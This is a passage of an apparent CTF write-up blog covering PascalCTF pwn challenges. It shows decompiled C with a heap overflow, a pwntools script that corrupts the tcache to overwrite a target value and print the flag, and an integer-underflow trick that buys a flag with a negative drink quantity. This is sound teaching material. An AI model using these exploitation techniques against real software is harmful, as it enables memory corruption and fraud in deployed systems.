+<h4 id="reverse-1">reverse</h4>
+<p>Heap challenge with a hidden functionnality</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_menu</span>();
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">5</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">check_target</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_target</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span> ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>target <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x2152411035014542</span>) {
+</span></span><span style="display:flex;"><span>     ...
+</span></span><span style="display:flex;"><span>      pcVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;FLAG&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(pcVar2);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span> ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With &rsquo;target&rsquo; as a global variable but pointing on the heap.
+And the tcache of size 0x51 already initialized for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup_chall</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_18 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; local_18 <span style="color:#f92672">=</span> local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x48</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(players <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)local_18 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> pvVar2;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> local_14; local_14 <span style="color:#f92672">=</span> local_14 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(players <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)local_14 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(players <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)local_14 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  target <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbabebabebabebabe</span>;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So heap is like that at the beginning of the chall:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x56196aef8010:	0x0005000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8020:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8030:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8040:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8050:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8060:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8070:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8080:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8090:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef80a0:	0x0000000000000000	0x000056196aef82a0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x56196aef8290:	0x0000000000000000	0x0000000000000051
+</span></span><span style="display:flex;"><span>0x56196aef82a0:	0x0000561c0b792c08	0x2c196d465d9c6e1d
+</span></span><span style="display:flex;"><span>0x56196aef82b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef82c0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef82d0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef82e0:	0x0000000000000000	0x0000000000000051
+</span></span><span style="display:flex;"><span>0x56196aef82f0:	0x0000561c0b792db8	0x2c196d465d9c6e1d
+</span></span><span style="display:flex;"><span>0x56196aef8300:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8310:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8320:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8330:	0x0000000000000000	0x0000000000000051
+</span></span><span style="display:flex;"><span>0x56196aef8340:	0x0000561c0b792d68	0x2c196d465d9c6e1d
+</span></span><span style="display:flex;"><span>0x56196aef8350:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8360:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8370:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8380:	0x0000000000000000	0x0000000000000051
+</span></span><span style="display:flex;"><span>0x56196aef8390:	0x0000561c0b792d18	0x2c196d465d9c6e1d
+</span></span><span style="display:flex;"><span>0x56196aef83a0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef83b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef83c0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef83d0:	0x0000000000000000	0x0000000000000051
+</span></span><span style="display:flex;"><span>0x56196aef83e0:	0x000000056196aef8	0x2c196d465d9c6e1d
+</span></span><span style="display:flex;"><span>0x56196aef83f0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8400:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8410:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8420:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x56196aef8430:	0xbabebabebabebabe	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x56196aef8440:	0x0000000000000000	0x0000000000020bc1
+</span></span></code></pre></div><p>There is an overflow in the &lsquo;create_player&rsquo; function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">create_player</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>      iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>      pvVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">long</span>)iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x48</span>);
+</span></span><span style="display:flex;"><span>      local_28 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_name</span>(pvVar4,iVar3);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_28 <span style="color:#f92672">&lt;=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f</span>) {
+</span></span><span style="display:flex;"><span>        local_28 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">read_message</span>((<span style="color:#66d9ef">long</span>)local_28 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)pvVar4);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="solve-1">solve</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;LD_LIBRARY_PATH&#34;</span>: <span style="color:#e6db74">&#34;.&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;FLAG&#34;</span>: <span style="color:#e6db74">&#34;aaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(i, s, n, m):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index&#34;</span>, i)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;length&#34;</span>, s)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name&#34;</span>, n)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;message&#34;</span>, m)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(i):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index&#34;</span>, i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">affiche</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">end</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./average_patched&#34;</span>, env<span style="color:#f92672">=</span>env)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = connect(&#34;ahc.ctf.pascalctf.it&#34;, 9003)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;tcache corruption to make these 0x51 tcached chunks in the 0x61 tcache list&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;alloc a 0x61 chunk in the last one which is 0x51 size
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">so we can overflow on the target chunk and write the expected value&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;16&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x37</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xdeadbeefcafebabe</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get_flag()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ /home/sk4r/pwn_env/bin/python /home/sk4r/CTF/PASCAL/pwn_average_heap_challenge/solve.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./average_patched&#39;</span>: pid <span style="color:#ae81ff">459411</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt; I see you know your way around this stuff, here<span style="color:#ae81ff">\&#39;</span>s a flag!
+</span></span><span style="display:flex;"><span>aaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span style="display:flex;"><span>1. Create Player
+</span></span><span style="display:flex;"><span>2. Delete Player
+</span></span><span style="display:flex;"><span>3. Print Players
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; $  
+</span></span></code></pre></div><!-------------------------------------------------------------------------------------->
+<h3 id="malta">malta</h3>
+<h4 id="attachments-2">attachments</h4>
+<p><a href="/ctf/pascalctf_01_26/malta/malta">malta</a>
+<a href="/ctf/pascalctf_01_26/malta/solve.py">solve.py</a></p>
+<h4 id="solve-2">solve</h4>
+<p>Integer underflow on the variable which count the money we have.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./malta
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>Welcome in Malta, here you<span style="color:#960050;background-color:#1e0010">&#39;</span>re to buy some of the cheapest cocktails in the world!
+</span></span><span style="display:flex;"><span>Your balance is: <span style="color:#ae81ff">100</span> €
+</span></span><span style="display:flex;"><span>1. Drink: Margarita <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>2. Drink: Mojito <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>3. Drink: Gin lemon <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> €
+</span></span><span style="display:flex;"><span>4. Drink: PascalCTF26 <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>5. Drink: Cosmopolitan <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>6. Drink: Lavander Collins <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">4</span> €
+</span></span><span style="display:flex;"><span>7. Drink: Japanese slipper <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> €
+</span></span><span style="display:flex;"><span>8. Drink: Blue angel <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>9. Drink: Martini <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">3</span> €
+</span></span><span style="display:flex;"><span>10. Drink: Flag <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1000000000</span> €
+</span></span><span style="display:flex;"><span>11. Exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Select a drink: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>How many drinks <span style="color:#66d9ef">do</span> you want? -1000000000
+</span></span><span style="display:flex;"><span>You bought -1000000000 Margarita <span style="color:#66d9ef">for</span> -1705032704 € and the barman told you its secret recipe: Tequila &amp; lime
+</span></span><span style="display:flex;"><span>Your balance is: <span style="color:#ae81ff">1705032804</span> €
+</span></span><span style="display:flex;"><span>1. Drink: Margarita <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>2. Drink: Mojito <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>3. Drink: Gin lemon <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> €
+</span></span><span style="display:flex;"><span>4. Drink: PascalCTF26 <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>5. Drink: Cosmopolitan <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>6. Drink: Lavander Collins <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">4</span> €
+</span></span><span style="display:flex;"><span>7. Drink: Japanese slipper <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> €
+</span></span><span style="display:flex;"><span>8. Drink: Blue angel <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">6</span> €
+</span></span><span style="display:flex;"><span>9. Drink: Martini <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">3</span> €
+</span></span><span style="display:flex;"><span>10. Drink: Flag <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1000000000</span> €
+</span></span><span style="display:flex;"><span>11. Exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Select a drink: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>How many drinks <span style="color:#66d9ef">do</span> you want? <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>You bought <span style="color:#ae81ff">1</span> Flag <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1000000000</span> € and the barman told you its secret recipe: FLAG<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><br>Thx.<br>Sk4r.</p>
+
+
+    <ul>
+    
+    </ul>
+
+
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+
+<ul class="aside__social-links">
+    
+</ul>
+</div>
+
+            <div class="aside__content">
+    
+
+            </div>
+            <div class="aside__toc">
+                <nav id="TableOfContents">
+  <ol>
+    <li><a href="#pwn">PWN</a>
+      <ol>
+        <li><a href="#yetanothernotetaker">YetAnotherNoteTaker</a>
+          <ol>
+            <li><a href="#attachments">attachments</a></li>
+            <li><a href="#reverse">reverse</a></li>
+            <li><a href="#solve">solve</a></li>
+          </ol>
+        </li>
+        <li><a href="#average_heap_challenge">average_heap_challenge</a>
+          <ol>
+            <li><a href="#attachments-1">attachments</a></li>
+            <li><a href="#reverse-1">reverse</a></li>
+            <li><a href="#solve-1">solve</a></li>
+          </ol>
+        </li>
+        <li><a href="#malta">malta</a>
+          <ol>
+            <li><a href="#attachments-2">attachments</a></li>
+            <li><a href="#solve-2">solve</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+            </div>
+        </section>
+
+        <section class="page__leftside">
+            
+
+            
+
+<section class="page__leftside">
+    
+    <nav class="menu">
+        <ul>
+            
+            <li>
+                <a href="/ctf/">CTF</a>
+
+                
+                <ul>
+                    
+                        <li><a href="/ctf/0xfun_02_26/">OxFun 02/26</a></li>
+                    
+                        <li><a href="/ctf/pascalctf_01_26/">PascalCTF 01/26</a></li>
+                    
+                        <li><a href="/ctf/0xlaugh_01_26/">0xLaugh 01/26</a></li>
+                    
+                        <li><a href="/ctf/scarletctf_01_26/">Scarlet CTF 01/26</a></li>
+                    
+                </ul>
+                
+
+            </li>
+            
+            <li>
+                <a href="/notes/">Notes</a>
+
+                
+                <ul>
+                    
+                        <li><a href="/notes/chall_syn_h2025/">Chall Synacktiv 12/25</a></li>
+                    
+                </ul>
+                
+
+            </li>
+            
+        </ul>
+    </nav>
+    
+</section>
+        </section>
+
+        <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+    
+    
+      
+      
+          
+            
+            
+                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>
+
+            
+          
+      
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+    </div>
+</body>
+
+</html>
